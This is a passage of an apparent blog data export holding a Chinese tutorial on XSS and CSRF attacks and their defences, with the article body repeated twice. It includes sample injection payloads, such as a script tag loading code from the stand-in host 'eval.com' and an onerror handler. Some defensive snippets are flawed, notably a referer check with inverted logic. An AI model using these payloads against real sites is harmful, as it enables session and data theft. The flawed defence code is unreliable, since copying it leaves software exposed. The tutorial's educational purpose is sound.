class=\"line\">1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies</span><br><span class=\"line\">2、评论被添加进数据库</span><br><span class=\"line\">3、用户都可以看见评论，并加载一个script</span><br><span class=\"line\">4、恶意script盗取用户信息</span><br></pre></td></tr></table></figure><p><strong>总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行</strong></p><h3 id=\"反射型XSS原理\"><a href=\"#反射型XSS原理\" class=\"headerlink\" title=\"反射型XSS原理\"></a>反射型XSS原理</h3><blockquote><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。</p></blockquote><p>下面看一个例子：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// url</span><br><span class=\"line\">http://example.com?search=value&apos;&lt;script src=&quot;http://eval.com&quot;&gt;&lt;/script&gt;&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">// html</span><br><span class=\"line\">&lt;input value=window.location.search&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">// 步骤</span><br><span class=\"line\">1、网页内嵌值由参数直接传入</span><br><span class=\"line\">2、恶意攻击者将参数包含script标签，加载恶意脚本</span><br><span class=\"line\">3、恶意脚本在网页中生效，盗取用户信息</span><br></pre></td></tr></table></figure><p><strong>总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行</strong></p><h2 id=\"XSS防御\"><a href=\"#XSS防御\" class=\"headerlink\" title=\"XSS防御\"></a>XSS防御</h2><h3 id=\"XSS注入点\"><a href=\"#XSS注入点\" class=\"headerlink\" title=\"XSS注入点\"></a>XSS注入点</h3><p>在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本</p><h4 id=\"HTML节点\"><a href=\"#HTML节点\" class=\"headerlink\" title=\"HTML节点\"></a>HTML节点</h4><p>html节点包含用户输入内容，节点内容包含脚本</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// HTML</span><br><span class=\"line\">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class=\"line\">// 用户输入，将content内容替换为&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id=\"HTML属性\"><a href=\"#HTML属性\" class=\"headerlink\" title=\"HTML属性\"></a>HTML属性</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// HTML</span><br><span class=\"line\">&lt;img src=&quot;$&#123;src&#125;&quot;&gt;</span><br><span class=\"line\">// 用户输入，将src替换为 2&quot; onerror=&quot;alert(2)</span><br><span class=\"line\">&lt;img src=&quot;2&quot; onerror=&quot;alert(2)&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id=\"JavaScript代码\"><a href=\"#JavaScript代码\" class=\"headerlink\" title=\"JavaScript代码\"></a>JavaScript代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// JS</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar data = &quot;$&#123;data&#125;&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar data = &quot;hello&quot;; alert(3);var a = &quot;&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id=\"富文本\"><a href=\"#富文本\" class=\"headerlink\" title=\"富文本\"></a>富文本</h4><p>由于富文本需要保留html的原因，因此本身会有xss风险</p><h3 id=\"XSS分析及防御\"><a href=\"#XSS分析及防御\" class=\"headerlink\" title=\"XSS分析及防御\"></a>XSS分析及防御</h3><p>了解攻击原理后，防御自然而然的也水到渠成了</p><h4 id=\"浏览器自带防御\"><a href=\"#浏览器自带防御\" class=\"headerlink\" title=\"浏览器自带防御\"></a>浏览器自带防御</h4><p>浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性</p><p>防御原理是将可能会执行脚本的标签或属性进行转义和过滤。</p><h4 id=\"HTML节点内容及属性防御\"><a href=\"#HTML节点内容及属性防御\" class=\"headerlink\" title=\"HTML节点内容及属性防御\"></a>HTML节点内容及属性防御</h4><p>将&lt;和&gt;转译成&amp;lt &amp;gt，将单引号，双引号，&amp;及空格等转译</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// HTML</span><br><span class=\"line\">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class=\"line\">// 用户输入&lt;script&gt;alert(1)&lt;/script&gt;后进行转译，将&lt;&gt;进行转译&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt</span><br><span class=\"line\">&lt;div&gt;&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id=\"Javascript代码防御\"><a href=\"#Javascript代码防御\" class=\"headerlink\" title=\"Javascript代码防御\"></a>Javascript代码防御</h4><p>使用JSON.stringify</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// JS</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar data = &quot;$&#123;data&#125;&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;,使用JSON.stringify(hello&quot;;alert(3); var a = &quot;)</span><br><span class=\"line\">// 对输入内容会出现转译错误，结束操作</span><br></pre></td></tr></table></figure><h4 id=\"富文本防御\"><a href=\"#富文本防御\" class=\"headerlink\" title=\"富文本防御\"></a>富文本防御</h4><p>按照白名单保留部分标签和属性</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var whiteList = &#123;</span><br><span class=\"line\">    &quot;img&quot;:[&quot;src&quot;],</span><br><span class=\"line\">    &quot;a&quot;:[&quot;href&quot;],</span><br><span class=\"line\">    &quot;font&quot;:[&quot;color&quot;,&quot;size&quot;]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">html.forEach(node =&gt; &#123;</span><br><span class=\"line\">    // 过滤白名单</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><p>最佳方式使用第三方<a href=\"https://github.com/leizongmin/js-xss\" target=\"_blank\" rel=\"noopener\">js-xss</a>白名单进行过滤</p><h3 id=\"XSS攻击防御总结：\"><a href=\"#XSS攻击防御总结：\" class=\"headerlink\" title=\"XSS攻击防御总结：\"></a>XSS攻击防御总结：</h3><ul><li>XSS是通过加载第三方脚本进行攻击</li><li>XSS攻击类型有存储型和反射型</li><li>XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本</li><li>XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御</li></ul><h1 id=\"啥又是CSRF？\"><a href=\"#啥又是CSRF？\" class=\"headerlink\" title=\"啥又是CSRF？\"></a>啥又是CSRF？</h1><h2 id=\"CSRF-Cross-Site-Request-forgery-介绍\"><a href=\"#CSRF-Cross-Site-Request-forgery-介绍\" class=\"headerlink\" title=\"CSRF(Cross Site Request forgery)介绍\"></a>CSRF(Cross Site Request forgery)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对CSRF的介绍</p><blockquote><p>Wikipedia:</p><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><p>MDN:</p><p>跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式</p></blockquote><p><strong>划重点：跨站请求伪造、冒充受信任用户、发送非预期请求</strong></p><p><strong>总结：CSRF是通过冒充用户来达到攻击目的的方式</strong></p><h2 id=\"CSRF原理\"><a href=\"#CSRF原理\" class=\"headerlink\" title=\"CSRF原理\"></a>CSRF原理</h2><p>CSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   www.a.com后端</span><br><span class=\"line\">\t  ||\\       |\\</span><br><span class=\"line\">   1||2          \\  3</span><br><span class=\"line\">   \\||             \\</span><br><span class=\"line\">www.a.com前端         www.b.com</span><br><span class=\"line\"></span><br><span class=\"line\">1、用户登陆A网站</span><br><span class=\"line\">2、A网站确认身份</span><br><span class=\"line\">3、B网站页面向A网站发起请求（带A网站身份）</span><br></pre></td></tr></table></figure><h2 id=\"CSRF分析及防御\"><a href=\"#CSRF分析及防御\" class=\"headerlink\" title=\"CSRF分析及防御\"></a>CSRF分析及防御</h2><h3 id=\"CSRF原理分析\"><a href=\"#CSRF原理分析\" class=\"headerlink\" title=\"CSRF原理分析\"></a>CSRF原理分析</h3><p>B网站向A网站发起攻击原理：</p><ul><li>B网站向A网站请求</li><li>携带A网站Cookie</li><li>不访问A网站前端</li><li>请求的referer为B网站</li></ul><h3 id=\"CSRF防御\"><a href=\"#CSRF防御\" class=\"headerlink\" title=\"CSRF防御\"></a>CSRF防御</h3><p>CSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过<strong>禁止使用第三方带来cookies，增加验证码、token机制</strong>。2、B网站访问A网站，故所携带的referer为B网站。则可以通过<strong>验证referer，禁止来自第三方请求</strong></p><h4 id=\"禁止第三方网站带来cookies\"><a href=\"#禁止第三方网站带来cookies\" class=\"headerlink\" title=\"禁止第三方网站带来cookies\"></a>禁止第三方网站带来cookies</h4><p>通过Cookie的SameSite禁止第三方访问</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: key=value; path=/; SameSite</span><br></pre></td></tr></table></figure><p>由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用</p><p>详细<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility\" target=\"_blank\" rel=\"noopener\">Cookie</a>可点击查看</p><h4 id=\"增加验证码，token\"><a href=\"#增加验证码，token\" class=\"headerlink\" title=\"增加验证码，token\"></a>增加验证码，token</h4><p>由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带</p><h4 id=\"验证referer，禁止来自第三方的请求\"><a href=\"#验证referer，禁止来自第三方的请求\" class=\"headerlink\" title=\"验证referer，禁止来自第三方的请求\"></a>验证referer，禁止来自第三方的请求</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// koa</span><br><span class=\"line\">let referer = ctx.request.headers.referer</span><br><span class=\"line\">if (/^https?:\\/\\/example.com/.test(referer)) &#123;</span><br><span class=\"line\">  // error</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer</p><p>在判断第三方请求时，可使用正则表达式</p><h2 id=\"CSRF攻击防御总结\"><a href=\"#CSRF攻击防御总结\" class=\"headerlink\" title=\"CSRF攻击防御总结\"></a>CSRF攻击防御总结</h2><ul><li>CSRF攻击主要是恶意网站访问已经具有登录态的网站</li><li>通过携带A网站的Cookie，以用户身份进行业务操作</li><li>攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站</li><li>防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求</li></ul><h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>XSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。</p>","site":{"data":{}},"excerpt":"","more":"<p>本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。</p><h1 id=\"啥是XSS？\"><a href=\"#啥是XSS？\" class=\"headerlink\" title=\"啥是XSS？\"></a>啥是XSS？</h1><h2 id=\"XSS-Cross-site-scripting-介绍\"><a href=\"#XSS-Cross-site-scripting-介绍\" class=\"headerlink\" title=\"XSS(Cross-site scripting)介绍\"></a>XSS(Cross-site scripting)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对XSS的介绍</p><blockquote><p>Wikipedia:</p><p><strong>跨网站指令码</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p>MDN:</p><p>跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者</p></blockquote><p><strong>划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限</strong></p><p><strong>总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取</strong></p><h2 id=\"XSS原理\"><a href=\"#XSS原理\" class=\"headerlink\" title=\"XSS原理\"></a>XSS原理</h2><p>被攻击的通常分为两种类型：<strong>存储型XSS、反射型XSS</strong></p><h3 id=\"存储型XSS原理\"><a href=\"#存储型XSS原理\" class=\"headerlink\" title=\"存储型XSS原理\"></a>存储型XSS原理</h3><blockquote><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p></blockquote><p>下面看一个例子：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// html 评论</span><br><span class=\"line\">&lt;input name=&quot;comment&quot; id=&quot;comment&quot; value=&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">// db</span><br><span class=\"line\">insert into table value(&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 步骤</span><br><span class=\"line\">1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies</span><br><span class=\"line\">2、评论被添加进数据库</span><br><span class=\"line\">3、用户都可以看见评论，并加载一个script</span><br><span class=\"line\">4、恶意script盗取用户信息</span><br></pre></td></tr></table></figure><p><strong>总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行</strong></p><h3 id=\"反射型XSS原理\"><a href=\"#反射型XSS原理\" class=\"headerlink\" title=\"反射型XSS原理\"></a>反射型XSS原理</h3><blockquote><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。</p></blockquote><p>下面看一个例子：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// url</span><br><span class=\"line\">http://example.com?search=value&apos;&lt;script src=&quot;http://eval.com&quot;&gt;&lt;/script&gt;&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">// html</span><br><span class=\"line\">&lt;input value=window.location.search&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">// 步骤</span><br><span class=\"line\">1、网页内嵌值由参数直接传入</span><br><span class=\"line\">2、恶意攻击者将参数包含script标签，加载恶意脚本</span><br><span class=\"line\">3、恶意脚本在网页中生效，盗取用户信息</span><br></pre></td></tr></table></figure><p><strong>总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行</strong></p><h2 id=\"XSS防御\"><a href=\"#XSS防御\" class=\"headerlink\" title=\"XSS防御\"></a>XSS防御</h2><h3 id=\"XSS注入点\"><a href=\"#XSS注入点\" class=\"headerlink\" title=\"XSS注入点\"></a>XSS注入点</h3><p>在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本</p><h4 id=\"HTML节点\"><a href=\"#HTML节点\" class=\"headerlink\" title=\"HTML节点\"></a>HTML节点</h4><p>html节点包含用户输入内容，节点内容包含脚本</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// HTML</span><br><span class=\"line\">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class=\"line\">// 用户输入，将content内容替换为&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id=\"HTML属性\"><a href=\"#HTML属性\" class=\"headerlink\" title=\"HTML属性\"></a>HTML属性</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// HTML</span><br><span class=\"line\">&lt;img src=&quot;$&#123;src&#125;&quot;&gt;</span><br><span class=\"line\">// 用户输入，将src替换为 2&quot; onerror=&quot;alert(2)</span><br><span class=\"line\">&lt;img src=&quot;2&quot; onerror=&quot;alert(2)&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id=\"JavaScript代码\"><a href=\"#JavaScript代码\" class=\"headerlink\" title=\"JavaScript代码\"></a>JavaScript代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// JS</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar data = &quot;$&#123;data&#125;&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar data = &quot;hello&quot;; alert(3);var a = &quot;&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id=\"富文本\"><a href=\"#富文本\" class=\"headerlink\" title=\"富文本\"></a>富文本</h4><p>由于富文本需要保留html的原因，因此本身会有xss风险</p><h3 id=\"XSS分析及防御\"><a href=\"#XSS分析及防御\" class=\"headerlink\" title=\"XSS分析及防御\"></a>XSS分析及防御</h3><p>了解攻击原理后，防御自然而然的也水到渠成了</p><h4 id=\"浏览器自带防御\"><a href=\"#浏览器自带防御\" class=\"headerlink\" title=\"浏览器自带防御\"></a>浏览器自带防御</h4><p>浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性</p><p>防御原理是将可能会执行脚本的标签或属性进行转义和过滤。</p><h4 id=\"HTML节点内容及属性防御\"><a href=\"#HTML节点内容及属性防御\" class=\"headerlink\" title=\"HTML节点内容及属性防御\"></a>HTML节点内容及属性防御</h4><p>将&lt;和&gt;转译成&amp;lt &amp;gt，将单引号，双引号，&amp;及空格等转译</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// HTML</span><br><span class=\"line\">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class=\"line\">// 用户输入&lt;script&gt;alert(1)&lt;/script&gt;后进行转译，将&lt;&gt;进行转译&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt</span><br><span class=\"line\">&lt;div&gt;&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id=\"Javascript代码防御\"><a href=\"#Javascript代码防御\" class=\"headerlink\" title=\"Javascript代码防御\"></a>Javascript代码防御</h4><p>使用JSON.stringify</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// JS</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar data = &quot;$&#123;data&#125;&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;,使用JSON.stringify(hello&quot;;alert(3); var a = &quot;)</span><br><span class=\"line\">// 对输入内容会出现转译错误，结束操作</span><br></pre></td></tr></table></figure><h4 id=\"富文本防御\"><a href=\"#富文本防御\" class=\"headerlink\" title=\"富文本防御\"></a>富文本防御</h4><p>按照白名单保留部分标签和属性</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var whiteList = &#123;</span><br><span class=\"line\">    &quot;img&quot;:[&quot;src&quot;],</span><br><span class=\"line\">    &quot;a&quot;:[&quot;href&quot;],</span><br><span class=\"line\">    &quot;font&quot;:[&quot;color&quot;,&quot;size&quot;]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">html.forEach(node =&gt; &#123;</span><br><span class=\"line\">    // 过滤白名单</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure><p>最佳方式使用第三方<a href=\"https://github.com/leizongmin/js-xss\" target=\"_blank\" rel=\"noopener\">js-xss</a>白名单进行过滤</p><h3 id=\"XSS攻击防御总结：\"><a href=\"#XSS攻击防御总结：\" class=\"headerlink\" title=\"XSS攻击防御总结：\"></a>XSS攻击防御总结：</h3><ul><li>XSS是通过加载第三方脚本进行攻击</li><li>XSS攻击类型有存储型和反射型</li><li>XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本</li><li>XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御</li></ul><h1 id=\"啥又是CSRF？\"><a href=\"#啥又是CSRF？\" class=\"headerlink\" title=\"啥又是CSRF？\"></a>啥又是CSRF？</h1><h2 id=\"CSRF-Cross-Site-Request-forgery-介绍\"><a href=\"#CSRF-Cross-Site-Request-forgery-介绍\" class=\"headerlink\" title=\"CSRF(Cross Site Request forgery)介绍\"></a>CSRF(Cross Site Request forgery)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对CSRF的介绍</p><blockquote><p>Wikipedia:</p><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><p>MDN:</p><p>跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式</p></blockquote><p><strong>划重点：跨站请求伪造、冒充受信任用户、发送非预期请求</strong></p><p><strong>总结：CSRF是通过冒充用户来达到攻击目的的方式</strong></p><h2 id=\"CSRF原理\"><a href=\"#CSRF原理\" class=\"headerlink\" title=\"CSRF原理\"></a>CSRF原理</h2><p>CSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   www.a.com后端</span><br><span class=\"line\">\t  ||\\       |\\</span><br><span class=\"line\">   1||2          \\  3</span><br><span class=\"line\">   \\||             \\</span><br><span class=\"line\">www.a.com前端         www.b.com</span><br><span class=\"line\"></span><br><span class=\"line\">1、用户登陆A网站</span><br><span class=\"line\">2、A网站确认身份</span><br><span class=\"line\">3、B网站页面向A网站发起请求（带A网站身份）</span><br></pre></td></tr></table></figure><h2 id=\"CSRF分析及防御\"><a href=\"#CSRF分析及防御\" class=\"headerlink\" title=\"CSRF分析及防御\"></a>CSRF分析及防御</h2><h3 id=\"CSRF原理分析\"><a href=\"#CSRF原理分析\" class=\"headerlink\" title=\"CSRF原理分析\"></a>CSRF原理分析</h3><p>B网站向A网站发起攻击原理：</p><ul><li>B网站向A网站请求</li><li>携带A网站Cookie</li><li>不访问A网站前端</li><li>请求的referer为B网站</li></ul><h3 id=\"CSRF防御\"><a href=\"#CSRF防御\" class=\"headerlink\" title=\"CSRF防御\"></a>CSRF防御</h3><p>CSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过<strong>禁止使用第三方带来cookies，增加验证码、token机制</strong>。2、B网站访问A网站，故所携带的referer为B网站。则可以通过<strong>验证referer，禁止来自第三方请求</strong></p><h4 id=\"禁止第三方网站带来cookies\"><a href=\"#禁止第三方网站带来cookies\" class=\"headerlink\" title=\"禁止第三方网站带来cookies\"></a>禁止第三方网站带来cookies</h4><p>通过Cookie的SameSite禁止第三方访问</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: key=value; path=/; SameSite</span><br></pre></td></tr></table></figure><p>由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用</p><p>详细<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility\" target=\"_blank\" rel=\"noopener\">Cookie</a>可点击查看</p><h4 id=\"增加验证码，token\"><a href=\"#增加验证码，token\" class=\"headerlink\" 